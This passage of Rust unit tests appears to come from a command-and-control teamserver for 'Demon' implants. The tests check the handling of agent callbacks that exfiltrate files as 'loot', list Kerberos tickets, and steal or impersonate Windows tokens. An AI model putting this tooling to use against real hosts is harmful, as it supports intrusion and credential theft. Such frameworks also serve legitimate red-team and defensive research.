        let file_id = 0x56_u32;
        let remote_path = "C:\\Windows\\Temp\\partial.txt";

        dispatcher
            .dispatch(
                0xABCD_EF22,
                u32::from(DemonCommand::BeaconOutput),
                0x78,
                &beacon_file_open(file_id, 32, remote_path),
            )
            .await?;
        dispatcher
            .dispatch(
                0xABCD_EF22,
                u32::from(DemonCommand::BeaconOutput),
                0x78,
                &beacon_file_write(file_id, b"beacon-"),
            )
            .await?;
        dispatcher
            .dispatch(
                0xABCD_EF22,
                u32::from(DemonCommand::BeaconOutput),
                0x78,
                &beacon_file_write(file_id, b"chunk"),
            )
            .await?;

        assert!(database.loot().list_for_agent(0xABCD_EF22).await?.is_empty());

        let _ = receiver.recv().await.ok_or("missing beacon open event")?;
        let progress_one = receiver.recv().await.ok_or("missing first beacon progress event")?;
        let progress_two = receiver.recv().await.ok_or("missing second beacon progress event")?;

        let OperatorMessage::AgentResponse(progress_one) = progress_one else {
            panic!("expected first beacon progress response");
        };
        assert_eq!(
            progress_one.info.extra.get("CurrentSize"),
            Some(&Value::String("7".to_owned()))
        );
        assert_eq!(
            progress_one.info.extra.get("ExpectedSize"),
            Some(&Value::String("32".to_owned()))
        );

        let OperatorMessage::AgentResponse(progress_two) = progress_two else {
            panic!("expected second beacon progress response");
        };
        assert_eq!(
            progress_two.info.extra.get("CurrentSize"),
            Some(&Value::String("12".to_owned()))
        );
        assert_eq!(
            progress_two.info.extra.get("ExpectedSize"),
            Some(&Value::String("32".to_owned()))
        );
        let active = dispatcher.downloads.active_for_agent(0xABCD_EF22).await;
        assert_eq!(active.len(), 1);
        assert_eq!(active[0].0, file_id);
        assert_eq!(active[0].1.request_id, 0x78);
        assert_eq!(active[0].1.remote_path, remote_path);
        assert_eq!(active[0].1.expected_size, 32);
        assert_eq!(active[0].1.data, b"beacon-chunk");
        assert!(
            !active[0].1.started_at.is_empty(),
            "active beacon download should preserve its start timestamp"
        );
        assert!(
            timeout(Duration::from_millis(50), receiver.recv()).await.is_err(),
            "beacon download should remain incomplete until close"
        );

        dispatcher
            .dispatch(
                0xABCD_EF22,
                u32::from(DemonCommand::BeaconOutput),
                0x78,
                &beacon_file_close(file_id),
            )
            .await?;

        let _ = receiver.recv().await.ok_or("missing beacon loot event")?;
        let completion = receiver.recv().await.ok_or("missing beacon completion event")?;
        let OperatorMessage::AgentResponse(completion) = completion else {
            panic!("expected beacon completion response");
        };
        assert_eq!(
            completion.info.extra.get("MiscData"),
            Some(&Value::String(BASE64_STANDARD.encode(b"beacon-chunk")))
        );

        let loot = database.loot().list_for_agent(0xABCD_EF22).await?;
        assert_eq!(loot.len(), 1);
        assert_eq!(loot[0].data.as_deref(), Some(b"beacon-chunk".as_slice()));
        assert_eq!(loot[0].file_path.as_deref(), Some(remote_path));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_beacon_file_callbacks_reject_writes_without_open()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        registry
            .insert(sample_agent_info(
                0xABCD_EF23,
                [0x11; AGENT_KEY_LENGTH],
                [0x22; AGENT_IV_LENGTH],
            ))
            .await?;
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry,
            events,
            database.clone(),
            sockets,
            None,
        );

        let error = dispatcher
            .dispatch(
                0xABCD_EF23,
                u32::from(DemonCommand::BeaconOutput),
                0x79,
                &beacon_file_write(0x57, b"orphan"),
            )
            .await
            .expect_err("beacon file write without open should fail");
        assert!(matches!(
            error,
            CommandDispatchError::InvalidCallbackPayload {
                command_id,
                message,
            } if command_id == u32::from(DemonCommand::BeaconOutput)
                && message == "download 0x00000057 was not opened"
        ));
        assert!(
            timeout(Duration::from_millis(50), receiver.recv()).await.is_err(),
            "unexpected events for rejected beacon download write"
        );
        assert!(database.loot().list_for_agent(0xABCD_EF23).await?.is_empty());
        Ok(())
    }

    #[tokio::test]
    async fn builtin_filesystem_download_handler_drops_downloads_over_limit()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        registry
            .insert(sample_agent_info(
                0xABCD_EF31,
                [0x11; AGENT_KEY_LENGTH],
                [0x22; AGENT_IV_LENGTH],
            ))
            .await?;
        let dispatcher = CommandDispatcher::with_builtin_handlers_and_max_download_bytes(
            registry,
            events,
            database.clone(),
            sockets,
            None,
            4,
        );

        let file_id = 0x91_u32;
        let mut open = Vec::new();
        add_u32(&mut open, u32::from(DemonFilesystemCommand::Download));
        add_u32(&mut open, 0);
        add_u32(&mut open, file_id);
        add_u64(&mut open, 8);
        add_utf16(&mut open, "C:\\Temp\\oversized.bin");
        dispatcher.dispatch(0xABCD_EF31, u32::from(DemonCommand::CommandFs), 0x99, &open).await?;

        let mut write = Vec::new();
        add_u32(&mut write, u32::from(DemonFilesystemCommand::Download));
        add_u32(&mut write, 1);
        add_u32(&mut write, file_id);
        add_bytes(&mut write, b"12345");
        let error = dispatcher
            .dispatch(0xABCD_EF31, u32::from(DemonCommand::CommandFs), 0x99, &write)
            .await
            .expect_err("oversized download should be rejected");
        assert!(matches!(
            error,
            crate::CommandDispatchError::DownloadTooLarge {
                agent_id: 0xABCD_EF31,
                file_id: 0x91,
                max_download_bytes: 4,
            }
        ));

        let open_event = receiver.recv().await.ok_or("missing open event")?;
        let OperatorMessage::AgentResponse(open_message) = open_event else {
            panic!("expected download open response");
        };
        assert_eq!(
            open_message.info.extra.get("MiscType"),
            Some(&Value::String("download-progress".to_owned()))
        );
        assert!(
            timeout(Duration::from_millis(50), receiver.recv()).await.is_err(),
            "oversized download should not emit progress or completion events"
        );
        assert!(database.loot().list_for_agent(0xABCD_EF31).await?.is_empty());

        let mut close = Vec::new();
        add_u32(&mut close, u32::from(DemonFilesystemCommand::Download));
        add_u32(&mut close, 2);
        add_u32(&mut close, file_id);
        add_u32(&mut close, 0);
        assert_eq!(
            dispatcher
                .dispatch(0xABCD_EF31, u32::from(DemonCommand::CommandFs), 0x99, &close)
                .await?,
            None
        );
        Ok(())
    }

    #[tokio::test]
    async fn builtin_beacon_file_callbacks_drop_downloads_over_limit()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        registry
            .insert(sample_agent_info(
                0xABCD_EF41,
                [0x11; AGENT_KEY_LENGTH],
                [0x22; AGENT_IV_LENGTH],
            ))
            .await?;
        let dispatcher = CommandDispatcher::with_builtin_handlers_and_max_download_bytes(
            registry,
            events,
            database.clone(),
            sockets,
            None,
            4,
        );

        let file_id = 0x92_u32;
        let mut open_header = Vec::new();
        open_header.extend_from_slice(&file_id.to_be_bytes());
        open_header.extend_from_slice(&8_u32.to_be_bytes());
        open_header.extend_from_slice(b"C:\\Windows\\Temp\\oversized.txt");
        let mut open = Vec::new();
        add_u32(&mut open, u32::from(DemonCallback::File));
        add_bytes(&mut open, &open_header);
        dispatcher
            .dispatch(0xABCD_EF41, u32::from(DemonCommand::BeaconOutput), 0x77, &open)
            .await?;

        let mut chunk = Vec::new();
        chunk.extend_from_slice(&file_id.to_be_bytes());
        chunk.extend_from_slice(b"12345");
        let mut write = Vec::new();
        add_u32(&mut write, u32::from(DemonCallback::FileWrite));
        add_bytes(&mut write, &chunk);
        let error = dispatcher
            .dispatch(0xABCD_EF41, u32::from(DemonCommand::BeaconOutput), 0x77, &write)
            .await
            .expect_err("oversized beacon download should be rejected");
        assert!(matches!(
            error,
            crate::CommandDispatchError::DownloadTooLarge {
                agent_id: 0xABCD_EF41,
                file_id: 0x92,
                max_download_bytes: 4,
            }
        ));

        let open_event = receiver.recv().await.ok_or("missing beacon open event")?;
        let OperatorMessage::AgentResponse(open_message) = open_event else {
            panic!("expected beacon open response");
        };
        assert_eq!(
            open_message.info.extra.get("MiscType"),
            Some(&Value::String("download-progress".to_owned()))
        );
        assert!(
            timeout(Duration::from_millis(50), receiver.recv()).await.is_err(),
            "oversized beacon download should not emit progress or completion events"
        );
        assert!(database.loot().list_for_agent(0xABCD_EF41).await?.is_empty());

        let mut close = Vec::new();
        add_u32(&mut close, u32::from(DemonCallback::FileClose));
        add_bytes(&mut close, &file_id.to_be_bytes());
        assert_eq!(
            dispatcher
                .dispatch(0xABCD_EF41, u32::from(DemonCommand::BeaconOutput), 0x77, &close)
                .await?,
            None
        );
        Ok(())
    }

    #[tokio::test]
    async fn with_builtin_handlers_and_max_download_bytes_happy_path()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        registry
            .insert(sample_agent_info(
                0xABCD_EF60,
                [0x11; AGENT_KEY_LENGTH],
                [0x22; AGENT_IV_LENGTH],
            ))
            .await?;
        let dispatcher = CommandDispatcher::with_builtin_handlers_and_max_download_bytes(
            registry,
            events,
            database.clone(),
            sockets,
            None,
            512,
        );

        let file_id = 0xA1_u32;
        let content = b"small-payload";

        // Open
        let mut open = Vec::new();
        add_u32(&mut open, u32::from(DemonFilesystemCommand::Download));
        add_u32(&mut open, 0);
        add_u32(&mut open, file_id);
        add_u64(&mut open, u64::try_from(content.len())?);
        add_utf16(&mut open, "C:\\Temp\\small.bin");
        dispatcher.dispatch(0xABCD_EF60, u32::from(DemonCommand::CommandFs), 0x99, &open).await?;

        // Write (13 bytes < 512 ceiling)
        let mut write = Vec::new();
        add_u32(&mut write, u32::from(DemonFilesystemCommand::Download));
        add_u32(&mut write, 1);
        add_u32(&mut write, file_id);
        add_bytes(&mut write, content);
        dispatcher.dispatch(0xABCD_EF60, u32::from(DemonCommand::CommandFs), 0x99, &write).await?;

        // Close
        let mut close = Vec::new();
        add_u32(&mut close, u32::from(DemonFilesystemCommand::Download));
        add_u32(&mut close, 2);
        add_u32(&mut close, file_id);
        add_u32(&mut close, 0);
        dispatcher.dispatch(0xABCD_EF60, u32::from(DemonCommand::CommandFs), 0x99, &close).await?;

        // Drain events: open, progress, loot, completion
        let _open_event = receiver.recv().await.ok_or("missing open event")?;
        let _progress_event = receiver.recv().await.ok_or("missing progress event")?;
        let loot_event = receiver.recv().await.ok_or("missing loot event")?;
        let _done_event = receiver.recv().await.ok_or("missing completion event")?;

        let OperatorMessage::AgentResponse(loot_message) = loot_event else {
            panic!("expected loot event");
        };
        assert_eq!(
            loot_message.info.extra.get("MiscType"),
            Some(&Value::String("loot-new".to_owned()))
        );

        let loot = database.loot().list_for_agent(0xABCD_EF60).await?;
        assert_eq!(loot.len(), 1);
        assert_eq!(loot[0].kind, "download");
        assert_eq!(loot[0].file_path.as_deref(), Some("C:\\Temp\\small.bin"));
        assert_eq!(loot[0].data.as_deref(), Some(content.as_slice()));
        Ok(())
    }

    #[tokio::test]
    async fn with_builtin_handlers_and_max_download_bytes_ceiling_exceeded()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        registry
            .insert(sample_agent_info(
                0xABCD_EF61,
                [0x11; AGENT_KEY_LENGTH],
                [0x22; AGENT_IV_LENGTH],
            ))
            .await?;
        let dispatcher = CommandDispatcher::with_builtin_handlers_and_max_download_bytes(
            registry,
            events,
            database.clone(),
            sockets,
            None,
            8,
        );

        let file_id = 0xA2_u32;

        // Open
        let mut open = Vec::new();
        add_u32(&mut open, u32::from(DemonFilesystemCommand::Download));
        add_u32(&mut open, 0);
        add_u32(&mut open, file_id);
        add_u64(&mut open, 32);
        add_utf16(&mut open, "C:\\Temp\\big.bin");
        dispatcher.dispatch(0xABCD_EF61, u32::from(DemonCommand::CommandFs), 0x99, &open).await?;

        // Write chunk that exceeds ceiling (9 bytes > 8)
        let mut write = Vec::new();
        add_u32(&mut write, u32::from(DemonFilesystemCommand::Download));
        add_u32(&mut write, 1);
        add_u32(&mut write, file_id);
        add_bytes(&mut write, b"123456789");
        let error = dispatcher
            .dispatch(0xABCD_EF61, u32::from(DemonCommand::CommandFs), 0x99, &write)
            .await
            .expect_err("download exceeding ceiling should be rejected");
        assert!(matches!(
            error,
            crate::CommandDispatchError::DownloadTooLarge {
                agent_id: 0xABCD_EF61,
                file_id: 0xA2,
                max_download_bytes: 8,
            }
        ));

        // Subsequent write for the same file_id should also fail (download was dropped)
        let mut write2 = Vec::new();
        add_u32(&mut write2, u32::from(DemonFilesystemCommand::Download));
        add_u32(&mut write2, 1);
        add_u32(&mut write2, file_id);
        add_bytes(&mut write2, b"ab");
        let error2 = dispatcher
            .dispatch(0xABCD_EF61, u32::from(DemonCommand::CommandFs), 0x99, &write2)
            .await;
        assert!(error2.is_err(), "writes after drop should be rejected");

        // Drain the open event, then confirm no further events
        let _open_event = receiver.recv().await.ok_or("missing open event")?;
        assert!(
            timeout(Duration::from_millis(50), receiver.recv()).await.is_err(),
            "oversized download should not emit progress or completion events"
        );
        assert!(database.loot().list_for_agent(0xABCD_EF61).await?.is_empty());
        Ok(())
    }

    #[tokio::test]
    async fn with_builtin_handlers_and_max_download_bytes_zero_ceiling()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        registry
            .insert(sample_agent_info(
                0xABCD_EF62,
                [0x11; AGENT_KEY_LENGTH],
                [0x22; AGENT_IV_LENGTH],
            ))
            .await?;
        let dispatcher = CommandDispatcher::with_builtin_handlers_and_max_download_bytes(
            registry,
            events,
            database.clone(),
            sockets,
            None,
            0,
        );

        let file_id = 0xA3_u32;

        // Open succeeds (start does not enforce the cap)
        let mut open = Vec::new();
        add_u32(&mut open, u32::from(DemonFilesystemCommand::Download));
        add_u32(&mut open, 0);
        add_u32(&mut open, file_id);
        add_u64(&mut open, 1);
        add_utf16(&mut open, "C:\\Temp\\zero.bin");
        dispatcher.dispatch(0xABCD_EF62, u32::from(DemonCommand::CommandFs), 0x99, &open).await?;

        // Even a single byte write should be rejected with ceiling=0
        let mut write = Vec::new();
        add_u32(&mut write, u32::from(DemonFilesystemCommand::Download));
        add_u32(&mut write, 1);
        add_u32(&mut write, file_id);
        add_bytes(&mut write, b"x");
        let error = dispatcher
            .dispatch(0xABCD_EF62, u32::from(DemonCommand::CommandFs), 0x99, &write)
            .await
            .expect_err("any write should be rejected with zero ceiling");
        assert!(matches!(
            error,
            crate::CommandDispatchError::DownloadTooLarge {
                agent_id: 0xABCD_EF62,
                file_id: 0xA3,
                max_download_bytes: 0,
            }
        ));

        // Drain the open event, confirm no loot persisted
        let _open_event = receiver.recv().await.ok_or("missing open event")?;
        assert!(
            timeout(Duration::from_millis(50), receiver.recv()).await.is_err(),
            "zero-ceiling download should not emit progress events"
        );
        assert!(database.loot().list_for_agent(0xABCD_EF62).await?.is_empty());
        Ok(())
    }

    #[tokio::test]
    async fn builtin_kerberos_klist_handler_formats_ticket_output()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonKerberosCommand::Klist));
        add_u32(&mut payload, 1);
        add_u32(&mut payload, 1);
        add_utf16(&mut payload, "alice");
        add_utf16(&mut payload, "LAB");
        add_u32(&mut payload, 0x1234);
        add_u32(&mut payload, 0x5678);
        add_u32(&mut payload, 1);
        add_utf16(&mut payload, "S-1-5-21");
        add_u32(&mut payload, 0xD53E_8000);
        add_u32(&mut payload, 0x019D_B1DE);
        add_u32(&mut payload, 2);
        add_utf16(&mut payload, "Kerberos");
        add_utf16(&mut payload, "DC01");
        add_utf16(&mut payload, "lab.local");
        add_utf16(&mut payload, "alice@lab.local");
        add_u32(&mut payload, 1);
        add_utf16(&mut payload, "alice");
        add_utf16(&mut payload, "LAB.LOCAL");
        add_utf16(&mut payload, "krbtgt");
        add_utf16(&mut payload, "LAB.LOCAL");
        add_u32(&mut payload, 0xD53E_8000);
        add_u32(&mut payload, 0x019D_B1DE);
        add_u32(&mut payload, 0xD53E_8000);
        add_u32(&mut payload, 0x019D_B1DE);
        add_u32(&mut payload, 0xD53E_8000);
        add_u32(&mut payload, 0x019D_B1DE);
        add_u32(&mut payload, 18);
        add_u32(&mut payload, 0x4081_0000);
        add_bytes(&mut payload, b"ticket");

        dispatcher
            .dispatch(0x0102_0304, u32::from(DemonCommand::CommandKerberos), 9, &payload)
            .await?;

        let event = receiver.recv().await.ok_or_else(|| "kerberos response missing".to_owned())?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected kerberos agent response event");
        };
        assert!(message.info.output.contains("UserName                : alice"));
        assert!(message.info.output.contains("Encryption type : AES256_CTS_HMAC_SHA1"));
        assert!(message.info.output.contains("Ticket          : dGlja2V0"));
        Ok(())
    }

    #[tokio::test]
    async fn token_steal_callback_broadcasts_success_event()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::Steal));
        add_utf16(&mut payload, "LAB\\admin");
        add_u32(&mut payload, 3);
        add_u32(&mut payload, 1234);
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 10, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token steal response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        let msg = message.info.extra.get("Message").and_then(|v| v.as_str()).unwrap_or("");
        assert_eq!(
            msg,
            "Successfully stole and impersonated token from 1234 User:[LAB\\admin] TokenID:[3]"
        );
        assert!(msg.contains("LAB\\admin"));
        assert!(msg.contains("TokenID:[3]"));
        Ok(())
    }

    #[tokio::test]
    async fn token_list_callback_formats_vault_table() -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::List));
        add_u32(&mut payload, 0);
        add_u32(&mut payload, 0xAB);
        add_utf16(&mut payload, "LAB\\svc");
        add_u32(&mut payload, 4444);
        add_u32(&mut payload, 1);
        add_u32(&mut payload, 1);
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 11, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token list response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert!(message.info.output.contains("LAB\\svc"));
        assert!(message.info.output.contains("stolen"));
        assert!(message.info.output.contains("Yes"));
        Ok(())
    }

    #[tokio::test]
    async fn token_list_callback_empty_vault() -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::List));
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 12, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token list empty response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert!(message.info.output.contains("token vault is empty"));
        Ok(())
    }

    #[tokio::test]
    async fn token_privs_list_callback_formats_privilege_table()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::PrivsGetOrList));
        add_u32(&mut payload, 1);
        add_bytes(&mut payload, b"SeDebugPrivilege\0");
        add_u32(&mut payload, 3);
        add_bytes(&mut payload, b"SeShutdownPrivilege\0");
        add_u32(&mut payload, 0);
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 13, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token privs list response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert!(message.info.output.contains("SeDebugPrivilege"));
        assert!(message.info.output.contains("Enabled"));
        assert!(message.info.output.contains("SeShutdownPrivilege"));
        assert!(message.info.output.contains("Disabled"));
        Ok(())
    }

    #[tokio::test]
    async fn token_privs_get_callback_success_and_failure() -> Result<(), Box<dyn std::error::Error>>
    {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::PrivsGetOrList));
        add_u32(&mut payload, 0);
        add_u32(&mut payload, 1);
        add_bytes(&mut payload, b"SeDebugPrivilege\0");
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 14, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token privs get response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        let msg = message.info.extra.get("Message").and_then(|v| v.as_str()).unwrap_or("");
        assert!(msg.contains("successfully enabled"));
        assert!(msg.contains("SeDebugPrivilege"));

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::PrivsGetOrList));
        add_u32(&mut payload, 0);
        add_u32(&mut payload, 0);
        add_bytes(&mut payload, b"SeDebugPrivilege\0");
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 15, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token privs get failure response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        let msg = message.info.extra.get("Message").and_then(|v| v.as_str()).unwrap_or("");
        assert!(msg.contains("Failed to enable"));
        Ok(())
    }

    #[tokio::test]
    async fn token_make_callback_success_and_empty() -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::Make));
        add_utf16(&mut payload, "LAB\\admin");
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 16, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token make response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        let msg = message.info.extra.get("Message").and_then(|v| v.as_str()).unwrap_or("");
        assert!(msg.contains("Successfully created and impersonated token"));
        assert!(msg.contains("LAB\\admin"));

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::Make));
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 17, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token make failure response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        let msg = message.info.extra.get("Message").and_then(|v| v.as_str()).unwrap_or("");
        assert!(msg.contains("Failed to create token"));
        Ok(())
    }

    #[tokio::test]
    async fn token_getuid_callback_elevated_and_normal() -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::GetUid));
        add_u32(&mut payload, 1);
        add_utf16(&mut payload, "LAB\\admin");
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 18, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token getuid response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        let msg = message.info.extra.get("Message").and_then(|v| v.as_str()).unwrap_or("");
        assert!(msg.contains("LAB\\admin"));
        assert!(msg.contains("(Admin)"));

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::GetUid));
        add_u32(&mut payload, 0);
        add_utf16(&mut payload, "LAB\\user");
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 19, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token getuid normal response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        let msg = message.info.extra.get("Message").and_then(|v| v.as_str()).unwrap_or("");
        assert!(msg.contains("LAB\\user"));
        assert!(!msg.contains("(Admin)"));
        Ok(())
    }

    #[tokio::test]
    async fn token_revert_callback_success_and_failure() -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::Revert));
        add_u32(&mut payload, 1);
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 20, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token revert response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        let msg = message.info.extra.get("Message").and_then(|v| v.as_str()).unwrap_or("");
        assert!(msg.contains("reverted token to itself"));

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::Revert));
        add_u32(&mut payload, 0);
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 21, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token revert failure response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        let msg = message.info.extra.get("Message").and_then(|v| v.as_str()).unwrap_or("");
        assert!(msg.contains("Failed to revert"));
        Ok(())
    }

    #[tokio::test]
    async fn token_remove_callback_success_and_failure() -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::Remove));
        add_u32(&mut payload, 1);
        add_u32(&mut payload, 5);
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 22, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token remove response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        let msg = message.info.extra.get("Message").and_then(|v| v.as_str()).unwrap_or("");
        assert!(msg.contains("removed token [5]"));

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::Remove));
        add_u32(&mut payload, 0);
        add_u32(&mut payload, 5);
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 23, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token remove failure response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        let msg = message.info.extra.get("Message").and_then(|v| v.as_str()).unwrap_or("");
        assert!(msg.contains("Failed to remove token [5]"));
        Ok(())
    }

    #[tokio::test]
    async fn token_clear_callback_broadcasts_success() -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::Clear));
        dispatcher
